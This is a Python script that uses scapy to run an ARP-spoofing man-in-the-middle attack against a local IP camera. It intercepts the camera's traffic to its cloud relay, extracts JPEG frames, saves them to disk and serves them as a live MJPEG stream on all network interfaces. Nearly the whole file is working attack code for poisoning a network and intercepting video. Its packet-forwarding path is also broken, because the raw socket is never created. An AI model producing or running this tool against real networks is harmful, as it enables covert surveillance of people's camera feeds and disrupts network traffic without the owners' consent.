#!/usr/bin/env python3
"""
Transparent MITM: captures camera relay traffic, extracts JPEGs, forwards to real relay.
Serves MJPEG at http://localhost:8080
"""
from scapy.all import *
import threading, time, struct, os, socket

CAM_IP = "192.168.1.148"
RELAY_IP = "49.237.71.144"
RELAY_PORT = 22036
GW_IP = "192.168.1.1"
OUTPUT_DIR = r"E:\open_camera\apk_analysis\frames"

os.makedirs(OUTPUT_DIR, exist_ok=True)

# MAC addresses
MY_MAC = "9c:6b:00:cf:27:e7"
GW_MAC = getmacbyip(GW_IP) or "ff:ff:ff:ff:ff:ff"
CAM_MAC = getmacbyip(CAM_IP) or "ff:ff:ff:ff:ff:ff"

print(f"MY MAC:  {MY_MAC}")
print(f"GW MAC:  {GW_MAC}")
print(f"CAM MAC: {CAM_MAC}")

frame_count = 0
latest_frame = b''
frame_lock = threading.Lock()
running = True
raw_sock = None

def spoof_loop():
    """Tell camera: I'm the gateway. Tell gateway: I'm the camera."""
    pkt1 = Ether(dst=CAM_MAC)/ARP(op=2, pdst=CAM_IP, hwdst=CAM_MAC, psrc=GW_IP, hwsrc=MY_MAC)
    pkt2 = Ether(dst=GW_MAC)/ARP(op=2, pdst=GW_IP, hwdst=GW_MAC, psrc=CAM_IP, hwsrc=MY_MAC)
    while running:
        sendp(pkt1, iface=conf.iface, verbose=False)
        sendp(pkt2, iface=conf.iface, verbose=False)
        time.sleep(0.8)

def forward_to_real(payload, src_ip, dst_ip):
    """Send captured packet to real destination"""
    global raw_sock
    if not raw_sock:
        return
    try:
        raw_sock.send(payload)
    except:
        pass

def extract_jpeg(payload):
    """Find JPEG frames in relay payload"""
    global frame_count, latest_frame
    
    # Method 1: Direct ffd8ff marker
    for i in range(len(payload)-3):
        if payload[i:i+3] == b'\xff\xd8\xff':
            # Found JPEG start - look for end
            for j in range(len(payload)-2, i+500, -1):
                if payload[j:j+2] == b'\xff\xd9':
                    jpeg = payload[i:j+2]
                    if len(jpeg) > 800:  # Minimum valid frame
                        frame_count += 1
                        fname = os.path.join(OUTPUT_DIR, f"frame_{frame_count:05d}.jpg")
                        with open(fname, 'wb') as f:
                            f.write(jpeg)
                        with frame_lock:
                            latest_frame = jpeg
                        if frame_count % 10 == 0:
                            print(f"[FRAME {frame_count}] {len(jpeg)} bytes saved")
                        return True
            break
    
    return False

def handle_packet(pkt):
    global frame_count
    
    if not pkt.haslayer(IP):
        return
    if not pkt.haslayer(Raw):
        return
    
    src = pkt[IP].src
    dst = pkt[IP].dst
    payload = bytes(pkt[Raw].load)
    
    # Only process camera -> relay traffic
    if src == CAM_IP and dst == RELAY_IP:
        if len(payload) > 100:
            extract_jpeg(payload)
        # Forward to real relay
        if raw_sock:
            try:
                raw_sock.sendto(raw(pkt), (GW_IP, 0))
            except:
                pass

def forward_relay_to_camera(pkt):
    """Forward relay responses back to camera"""
    if not pkt.haslayer(IP) or not raw_sock:
        return
    if pkt[IP].src == RELAY_IP and pkt[IP].dst == CAM_IP:
        try:
            raw_sock.sendto(raw(pkt), (CAM_IP, 0))
        except:
            pass

# HTTP MJPEG server
def http_server():
    from http.server import HTTPServer, BaseHTTPRequestHandler
    
    class MJPEGHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/cam.mjpg':
                self.send_response(200)
                self.send_header('Content-Type', 'multipart/x-mixed-replace; boundary=FRAME')
                self.send_header('Cache-Control', 'no-cache')
                self.end_headers()
                last = 0
                while True:
                    global frame_count, latest_frame
                    if frame_count > last and latest_frame:
                        self.wfile.write(b'--FRAME\r\nContent-Type: image/jpeg\r\n')
                        self.wfile.write(f'Content-Length: {len(latest_frame)}\r\n\r\n'.encode())
                        self.wfile.write(latest_frame)
                        self.wfile.write(b'\r\n')
                        last = frame_count
                    time.sleep(0.05)
            elif self.path == '/':
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                html = f"""<html><body>
                <h1>Camera Feed</h1>
                <img src="/cam.mjpg" style="max-width:100%">
                <p>Frames: {frame_count}</p></body></html>"""
                self.wfile.write(html.encode())
            else:
                self.send_response(404)
                self.end_headers()
    
    server = HTTPServer(('0.0.0.0', 8080), MJPEGHandler)
    print("[HTTP] MJPEG server: http://localhost:8080")
    server.serve_forever()

print("Starting MITM capture...")
print(f"[*] Frames saved to: {OUTPUT_DIR}")
print(f"[*] Open http://localhost:8080 in browser")
print(f"[*] Now open 365Cam app to start camera streaming")

# Start threads
threading.Thread(target=spoof_loop, daemon=True).start()
threading.Thread(target=http_server, daemon=True).start()
time.sleep(1)

# Main capture loop
try:
    sniff(
        iface=conf.iface,
        filter=f"(host {CAM_IP} and host {RELAY_IP}) or (host {RELAY_IP} and host {CAM_IP})",
        prn=handle_packet,
        store=False
    )
except KeyboardInterrupt:
    pass
except Exception as e:
    print(f"Error: {e}")
finally:
    running = False
    print(f"\nTotal frames: {frame_count}")
